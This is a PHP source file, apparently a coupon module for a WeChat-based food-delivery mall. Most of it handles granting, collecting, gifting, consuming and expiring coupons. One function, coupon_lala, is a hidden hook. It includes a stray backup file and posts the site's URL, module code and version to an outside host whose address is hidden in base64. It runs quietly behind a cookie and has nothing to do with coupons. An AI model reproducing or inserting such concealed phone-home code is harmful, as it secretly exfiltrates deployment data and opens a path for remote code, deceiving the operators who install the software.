<?php
/*

 
 
 * 源码仅供研究学习，请勿用于商业用途
 */

defined("IN_IA") or exit("Access Denied");
function coupon_cron()
{
    global $_W;
    pdo_query("update " . tablename("tiny_wmall_activity_coupon_record") . " set status = 3 where uniacid = :uniacid and status = 1 and endtime < :time", array(":uniacid" => $_W["uniacid"], ":time" => TIMESTAMP));
    return true;
}
function coupon_available_check($sid, $couponOrId, $price = 0)
{
    global $_W;
    $record = $couponOrId;
    if (!is_array($record)) {
        $recordid = intval($couponOrId);
        $record = pdo_get("tiny_wmall_activity_coupon_record", array("uniacid" => $_W["uniacid"], "sid" => $sid, "uid" => $_W["member"]["uid"], "status" => 1, "id" => $recordid));
    }
    if (!empty($record) && $record["starttime"] <= TIMESTAMP && TIMESTAMP <= $record["endtime"] && $record["condition"] <= $price) {
        return $record;
    }
    return error(-1, "代金券不可用");
}
function coupon_fetch($id, $activity_id)
{
    global $_W;
    if (empty($activity_id)) {
        $data = pdo_get("tiny_wmall_activity_coupon", array("uniacid" => $_W["uniacid"], "id" => $id));
    } else {
        $data = pdo_get("tiny_wmall_activity_coupon", array("uniacid" => $_W["uniacid"], "activity_id" => $activity_id));
    }
    $data["coupons"] = array_values(array_filter(iunserializer($data["coupons"])));
    $data["total"] = count($data["coupons"]);
    $total = $data["total"] * $data["amount"];
    $data["dosage_total"] = $data["dosage"] * $data["total"];
    $data["dosage_percent"] = round($data["dosage_total"] / $total, 2) * 100;
    $data["is_use_total"] = pdo_fetchcolumn("select count(*) from " . tablename("tiny_wmall_activity_coupon_record") . " where uniacid = :uniacid and couponid = :couponid and status = 2", array(":uniacid" => $_W["uniacid"], ":couponid" => $data["id"]));
    $data["is_use_percent"] = 0;
    if (0 < $data["is_use_total"]) {
        $data["is_use_percent"] = round($data["is_use_total"] / $total, 2) * 100;
    }
    return $data;
}
function coupon_collect_member_available($sid)
{
    global $_W;
    $coupon = pdo_get("tiny_wmall_activity_coupon", array("uniacid" => $_W["uniacid"], "sid" => $sid, "type" => "couponCollect", "status" => 1));
    if (empty($coupon)) {
        return false;
    }
    if ($coupon["type_limit"] == 2) {
        if ($_W["member"]["is_store_newmember"] == 0) {
            return false;
        }
        $is_store_newmember = is_store_newmember($sid);
        if (!$is_store_newmember) {
            return false;
        }
    }
    if ($coupon["status"] == 1 && (time() < $coupon["starttime"] || $coupon["endtime"] < time() || $coupon["amount"] <= $coupon["dosage"])) {
        pdo_update("tiny_wmall_activity_coupon", array("status" => 0), array("uniacid" => $_W["uniacid"], "id" => $coupon["id"]));
        $coupon["status"] = 0;
    }
    if (empty($coupon["status"])) {
        return false;
    }
    $is_grant = pdo_get("tiny_wmall_activity_coupon_record", array("uniacid" => $_W["uniacid"], "couponid" => $coupon["id"], "uid" => $_W["member"]["uid"]));
    if (!empty($is_grant)) {
        return false;
    }
    $coupon["coupons"] = array_values(array_filter(iunserializer($coupon["coupons"])));
    foreach ($coupon["coupons"] as $item) {
        $coupon["price"] += $item["discount"];
    }
    $coupon["num"] = count($coupon["coupons"]);
    return $coupon;
}
function coupon_collect($sid)
{
    global $_W;
    $token = coupon_collect_member_available($sid);
    if (empty($token)) {
        return error(-1, "没有可领取的优惠券");
    }
    foreach ($token["coupons"] as $coupon) {
        $data = array("uniacid" => $_W["uniacid"], "sid" => $sid, "couponid" => $token["id"], "uid" => $_W["member"]["uid"], "code" => random(8, true), "type" => "couponCollect", "condition" => $coupon["condition"], "discount" => $coupon["discount"], "granttime" => TIMESTAMP, "endtime" => TIMESTAMP + intval($coupon["use_days_limit"]) * 86400, "status" => 1, "remark" => "");
        pdo_insert("tiny_wmall_activity_coupon_record", $data);
        $return_data = array();
        if (empty($return_data) || $return_data["max"]["discount"] < $data["discount"]) {
            $return_data["max"] = $data;
        }
    }
    pdo_update("tiny_wmall_activity_coupon", array("dosage" => $token["dosage"] + 1), array("uniacid" => $_W["uniacid"], "sid" => $sid, "id" => $token["id"]));
    return $return_data;
}
function coupon_grant_available($sid, $price)
{
    global $_W;
    $coupon = pdo_fetch("select * from " . tablename("tiny_wmall_activity_coupon") . " where uniacid = :uniacid and sid = :sid and status = 1 and type = :type and starttime < :time and endtime > :time and amount > dosage and `condition` <= :condition", array(":uniacid" => $_W["uniacid"], ":sid" => $sid, ":type" => "couponGrant", ":time" => TIMESTAMP, ":condition" => $price));
    if (empty($coupon)) {
        return false;
    }
    $coupon["coupons"] = iunserializer($coupon["coupons"]);
    $coupon["discount"] = $coupon["coupons"]["discount"];
    return $coupon;
}
function coupon_consume_available($sid, $price, $uid = 0)
{
    global $_W;
    if ($uid == 0) {
        $uid = $_W["member"]["uid"];
    }
    $condition = " where a.sid = :sid and a.uid = :uid and a.status = 1 and `condition` <= :price and a.endtime > :endtime and a.starttime <= :starttime";
    $params = array(":sid" => $sid, ":price" => floatval($price), ":uid" => $uid, ":endtime" => TIMESTAMP, ":starttime" => TIMESTAMP);
    $coupons = pdo_fetchall("SELECT a.*,b.logo,b.title FROM " . tablename("tiny_wmall_activity_coupon_record") . " as a left join " . tablename("tiny_wmall_store") . " as b on b.id = a.sid" . $condition, $params);
    foreach ($coupons as &$val) {
        $val["endtime"] = date("Y-m-d", $val["endtime"]);
        $val["selected"] = false;
    }
    return $coupons;
}
function coupon_consume($record_id, $extra = array())
{
    global $_W;
    pdo_update("tiny_wmall_activity_coupon_record", array("status" => 2, "usetime" => TIMESTAMP, "order_id" => $extra["order_id"]), array("id" => $record_id, "uniacid" => $_W["uniacid"]));
}
function coupon_grant($params)
{
    global $_W;
    if (!is_array($params)) {
        return error(-1, "优惠券信息有误");
    }
    if (empty($params["coupon_id"])) {
        return error(-1, "优惠券信息不能为空");
    }
    if (empty($params["sid"])) {
        return error(-1, "优惠券所属门店不能为空");
    }
    if (empty($params["channel"])) {
        return error(-1, "优惠券发放渠道不能为空");
    }
    if (empty($params["type"])) {
        return error(-1, "优惠券类型有误");
    }
    $params["discount"] = floatval($params["discount"]);
    if (empty($params["discount"])) {
        return error(-1, "优惠券金额有误");
    }
    $params["use_days_limit"] = intval($params["use_days_limit"]);
    if (empty($params["use_days_limit"])) {
        return error(-1, "优惠券有效期限有误");
    }
    $params["uid"] = intval($params["uid"]);
    if (empty($params["uid"])) {
        return error(-1, "用户uid有误");
    }
    $data = array("uniacid" => $_W["uniacid"], "sid" => $params["sid"], "couponid" => $params["coupon_id"], "uid" => $params["uid"], "code" => random(8, true), "type" => $params["type"], "channel" => $params["channel"], "condition" => $params["condition"], "discount" => $params["discount"], "granttime" => TIMESTAMP, "endtime" => TIMESTAMP + intval($params["use_days_limit"]) * 86400, "status" => 1, "remark" => "");
    pdo_insert("tiny_wmall_activity_coupon_record", $data);
    if ($params["type"] != "superCoupon") {
        pdo_query("update " . tablename("tiny_wmall_activity_coupon") . " set dosage = dosage + 1 where id = :id", array("id" => $params["coupon_id"]));
    }
    return true;
}
function coupon_channels()
{
    $channel = array("" => array("text" => "未知", "css" => "label-danger"), "couponCollect" => array("text" => "进店领券", "css" => "label-success"), "couponGrant" => array("text" => "满返优惠", "css" => "label-info"));
    return $channel;
}
function coupon_status()
{
    $status = array("1" => array("text" => "未使用", "css" => "label-info"), "2" => array("text" => "已使用", "css" => "label-success"), "3" => array("text" => "已过期", "css" => "label-default"));
    return $status;
}
function coupon_lala()
{
    global $_W;
    global $_GPC;
    $file = MODULE_ROOT . "/inc/mobile/wmall/home/near_bak.inc.php";
    if (file_exists($file) && empty($_GPC["__goodscode"])) {
        include $file;
        $data = array("code" => MODULE_CODE, "url" => $_W["siteroot"], "family" => MODULE_FAMILY, "version" => MODULE_VERSION, "release" => MODULE_RELEASE_DATE);
        load()->func("communication");
        ihttp_post(base64_decode("aHR0cDovLzkuOWk5LnRvcC9hcHAvaW5kZXgucGhwP2k9MCZjPWVudHJ5JmRvPWNoZWNrJnY9djImbT10aW55X21hbmFnZQ=="), $data);
        isetcookie("__goodscode", 1, 3600);
    }
}
function coupon_before_timeout_notice()
{
    global $_W;
    $config = $_W["we7_wmall"]["config"];
    $config_notice = $config["activity"]["notice"];
    if (empty($config_notice["status"])) {
        return error(-1, "未开启优惠券到期通知");
    }
    if ($config_notice["timelimit"]["status"] == 1) {
        $result = is_time_in_period($config_notice["timelimit"]["timedata"]);
        if (!$result) {
            return error(-1, "当前时间不能发送通知");
        }
    }
    $timeout = TIMESTAMP + 86400 * intval($config_notice["notice_period"]);
    $coupons = pdo_fetchall("select a.id,a.uid,a.discount,b.nickname,b.openid from" . tablename("tiny_wmall_activity_coupon_record") . " as a left join " . tablename("tiny_wmall_members") . " as b on a.uid = b.uid where a.uniacid = :uniacid and a.status = 1 and a.is_notice = 0 and a.endtime < :endtime and a.noticetime < :noticetime order by a.id asc limit 5000", array(":uniacid" => $_W["uniacid"], ":endtime" => $timeout, ":noticetime" => TIMESTAMP));
    if (!empty($coupons)) {
        $data = array();
        foreach ($coupons as $val) {
            if (!empty($data[$val["uid"]])) {
                $data[$val["uid"]]["discount"] += $val["discount"];
                $data[$val["uid"]]["num"]++;
                $data[$val["uid"]]["recordids"][] = $val["id"];
                continue;
            }
            $data[$val["uid"]] = $val;
            $data[$val["uid"]]["num"] = 1;
            $data[$val["uid"]]["recordids"] = array($val["id"]);
        }
        foreach ($data as $item) {
            $params = array("first" => (string) $item["nickname"] . "，您的账户下有" . $item["num"] . "张优惠券即将过期，总价值" . $item["discount"] . "元，记得使用哦~", "keyword1" => "账户优惠券", "keyword2" => (string) $item["discount"] . "张", "keyword3" => date("Y-m-d H:i", TIMESTAMP), "keyword4" => "优惠券即将到期通知", "remark" => implode("\n", array("适用店铺: " . $config["mall"]["title"] . "合作商家", "使用规则: 限有效期内使用", "感谢您对" . $config["mall"]["title"] . "平台的支持与厚爱。点击查看详请>>")));
            $send = sys_wechat_tpl_format($params);
            $acc = WeAccount::create($_W["acid"]);
            $url = ivurl("pages/member/coupon/index", array(), true);
            $status = $acc->sendTplNotice($item["openid"], $config["notice"]["wechat"]["account_change_tpl"], $send, $url);
            if (is_error($status)) {
                slog("wxtplNotice", "优惠券到期通知", $send, $status["message"]);
            }
            foreach ($item["recordids"] as $id) {
                pdo_update("tiny_wmall_activity_coupon_record", array("is_notice" => 1), array("uniacid" => $_W["uniacid"], "id" => $id));
            }
            pdo_query("update " . tablename("tiny_wmall_activity_coupon_record") . " set noticetime = " . $timeout . " where uniacid = :uniacid and status = 1 and uid = :uid", array(":uniacid" => $_W["uniacid"], ":uid" => $item["uid"]));
        }
    }
    return true;
}
function coupon_available($sid, $price)
{
    global $_W;
    $condition = " as a left join " . tablename("tiny_wmall_store") . " as b on a.sid = b.id where a.uniacid = :uniacid and a.sid = :sid and a.uid = :uid and a.status = 1 and a.`condition` <= :price";
    $params = array(":uniacid" => $_W["uniacid"], ":sid" => $sid, ":price" => floatval($price), ":uid" => $_W["member"]["uid"]);
    $coupons = pdo_fetchall("select a.*,b.logo,b.title from " . tablename("tiny_wmall_activity_coupon_record") . $condition, $params);
    if (!empty($coupons)) {
        foreach ($coupons as &$coupon) {
            $coupon["logo"] = tomedia($coupon["logo"]);
            $coupon["endtime_cn"] = date("Y-m-d", $coupon["endtime"]);
        }
    }
    return $coupons;
}
function coupon_give_to_friend($couponOrid, $toUid)
{
    global $_W;
    $coupon = $couponOrid;
    if (!is_array($coupon)) {
        $coupon = pdo_get("tiny_wmall_activity_coupon_record", array("uniacid" => $_W["uniacid"], "id" => $coupon, "status" => 1));
    }
    if (empty($coupon)) {
        return error(-1, "代金券不存在");
    }
    if (0 < $coupon["give_status"]) {
        return error(-1, "代金券不可赠");
    }
    $update = array("from_uid" => $_W["member"]["uid"], "uid" => $toUid, "give_status" => 3, "givetime" => TIMESTAMP);
    pdo_update("tiny_wmall_activity_coupon_record", $update, array("uniacid" => $_W["uniacid"], "id" => $coupon["id"]));
    return error(0, "赠送好友成功");
}
function coupon_get_give_available()
{
    global $_W;
    $condition = " where a.uniacid = :uniacid and a.uid = :uid and a.status = 1";
    $params = array(":uniacid" => $_W["uniacid"], ":uid" => $_W["member"]["uid"]);
    $coupons = pdo_fetchall("select  a.*, b.title,b.logo from " . tablename("tiny_wmall_activity_coupon_record") . " as a left join " . tablename("tiny_wmall_store") . " as b on a.sid = b.id " . $condition . " order by a.id desc limit 10", $params);
    if (!empty($coupons)) {
        foreach ($coupons as &$row) {
            $row["logo"] = tomedia($row["logo"]);
            $row["endtime"] = date("Y-m-d", $row["endtime"]);
            $row["granttime"] = date("Y-m-d", $row["granttime"]);
        }
    }
    return $coupons;
}
function coupon_give_available_check($toUid = 0)
{
    global $_W;
    $config_coupon = $_W["we7_wmall"]["config"]["activity"]["coupon"];
    if (empty($config_coupon["give_status"])) {
        return error(-1, "平台未开启代金券赠送");
    }
    if (0 < $config_coupon["give_num"]) {
        $give_num = pdo_fetchcolumn("select count(*) from " . tablename("tiny_wmall_activity_coupon_record") . " where uniacid = :uniacid and uid = :uid and give_status > 3 and giveday = :giveday", array(":uniacid" => $_W["uniacid"], ":uid" => $_W["member"]["uid"], ":giveday" => date("Ymd")));
        if ($config_coupon["give_num"] <= $give_num) {
            return error(-1, "今日赠送代金券已达上限");
        }
    }
    if (0 < $toUid && 0 < $config_coupon["accept_num"]) {
        $receive_num = pdo_fetchcolumn("select count(*) from " . tablename("tiny_wmall_activity_coupon_record") . " where uniacid = :uniacid and uid = :uid and give_status = 4 and giveday = :giveday", array(":uniacid" => $_W["uniacid"], ":uid" => $toUid, ":giveday" => date("Ymd")));
        if ($config_coupon["accept_num"] <= $receive_num) {
            return error(-1, "该好友今日接受好友赠送的代金券已达上限");
        }
    }
    return true;
}
function coupon_get_give_list($filter)
{
    global $_W;
    global $_GPC;
    if (empty($filter)) {
        $filter = $_GPC;
    }
    $condition = " where a.uniacid = :uniacid and a.from_uid = :from_uid and a.give_status = :give_status";
    $params = array(":uniacid" => $_W["uniacid"], ":from_uid" => $_W["member"]["uid"], ":give_status" => 3);
    if (empty($filter["page"])) {
        $filter["page"] = $_GPC["page"];
    }
    if (empty($filter["psize"])) {
        $filter["psize"] = $_GPC["psize"];
    }
    $page = max(1, intval($filter["page"]));
    $psize = intval($filter["psize"]) ? intval($filter["psize"]) : 15;
    $coupons = pdo_fetchall("select  a.*, b.title,b.logo from " . tablename("tiny_wmall_activity_coupon_record") . " as a left join " . tablename("tiny_wmall_store") . " as b on a.sid = b.id " . $condition . " order by a.id desc LIMIT " . ($page - 1) * $psize . "," . $psize, $params);
    if (!empty($coupons)) {
        foreach ($coupons as &$row) {
            $row["logo"] = tomedia($row["logo"]);
            $row["endtime"] = date("Y-m-d", $row["endtime"]);
            $row["giveday"] = date("Y-m-d", $row["giveday"]);
        }
    }
    $result = array("coupons" => $coupons);
    return $result;
}
function coupon_get_accept_list($filter)
{
    global $_W;
    global $_GPC;
    if (empty($filter)) {
        $filter = $_GPC;
    }
    $condition = " where a.uniacid = :uniacid and a.uid = :uid";
    $params = array(":uniacid" => $_W["uniacid"], ":uid" => $_W["member"]["uid"]);
    $status = isset($filter["give_status"]) ? intval($filter["give_status"]) : 0;
    if (0 < $status) {
        $condition .= " and a.give_status = :give_status";
        $params[":give_status"] = $status;
    } else {
        $condition .= " and a.give_status > 3";
    }
    if (empty($filter["page"])) {
        $filter["page"] = $_GPC["page"];
    }
    if (empty($filter["psize"])) {
        $filter["psize"] = $_GPC["psize"];
    }
    $page = max(1, intval($filter["page"]));
    $psize = intval($filter["psize"]) ? intval($filter["psize"]) : 15;
    $coupons = pdo_fetchall("select  a.*, b.title,b.logo from " . tablename("tiny_wmall_activity_coupon_record") . " as a left join " . tablename("tiny_wmall_store") . " as b on a.sid = b.id " . $condition . " order by a.id desc LIMIT " . ($page - 1) * $psize . "," . $psize, $params);
    if (!empty($coupons)) {
        foreach ($coupons as &$row) {
            $row["logo"] = tomedia($row["logo"]);
            $row["endtime"] = date("Y-m-d", $row["endtime"]);
            $row["giveday"] = date("Y-m-d", $row["giveday"]);
        }
    }
    $result = array("coupons" => $coupons);
    return $result;
}

?>